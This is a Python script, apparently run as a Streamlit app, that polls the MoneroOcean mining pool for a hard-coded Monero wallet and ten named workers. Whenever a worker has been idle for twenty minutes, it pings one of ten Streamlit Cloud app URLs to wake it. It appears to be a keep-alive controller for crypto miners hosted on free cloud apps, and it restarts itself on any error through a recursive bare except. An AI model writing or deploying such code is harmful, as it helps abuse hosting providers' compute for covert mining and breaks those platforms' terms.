import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 20:
    #mxt v2 
    if worker == "mv2gen1":
      requests.get("https://vyom00907-mv2faujh-mv2gen1-liilfe.streamlit.app/")
    if worker == "mv2gen2":
      requests.get("https://vyom00907-mv2faujh-mv2gen2-k8o2nr.streamlit.app/")
    if worker == "mv2gen3":
      requests.get("https://vyom00907-mv2faujh-mv2gen3-zezt1k.streamlit.app/")
    if worker == "mv2gen4":
      requests.get("https://vyom00907-mv2faujh-mv2gen4-ct891n.streamlit.app/")
    if worker == "mv2gen5":
      requests.get("https://vyom00907-mv2faujh-mv2gen5-mnagn0.streamlit.app/")
    if worker == "mv2gen6":
      requests.get("https://vyom00907-mv2faujh-mv2gen6-u9yndz.streamlit.app/")
    if worker == "mv2gen7":
      requests.get("https://vyom00907-mv2faujh-mv2gen7-u8kxke.streamlit.app/")
    if worker == "mv2gen8":
      requests.get("https://vyom00907-mv2faujh-mv2gen8-irrnfx.streamlit.app/")
    if worker == "mv2gen9":
      requests.get("https://vyom00907-mv2faujh-mv2gen9-rlq22f.streamlit.app/")
    if worker == "mv2gen10":
      requests.get("https://vyom00907-mv2faujh-mv2gen10-sz9de1.streamlit.app/")
    
 
      

def stch():
    while 1==1 :
      
      #mv2
      resp("mv2gen1")
      resp("mv2gen2")
      resp("mv2gen3")
      resp("mv2gen4")
      resp("mv2gen5")
      resp("mv2gen6")
      resp("mv2gen7")
      resp("mv2gen8")
      resp("mv2gen9")
      resp("mv2gen10")
      

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
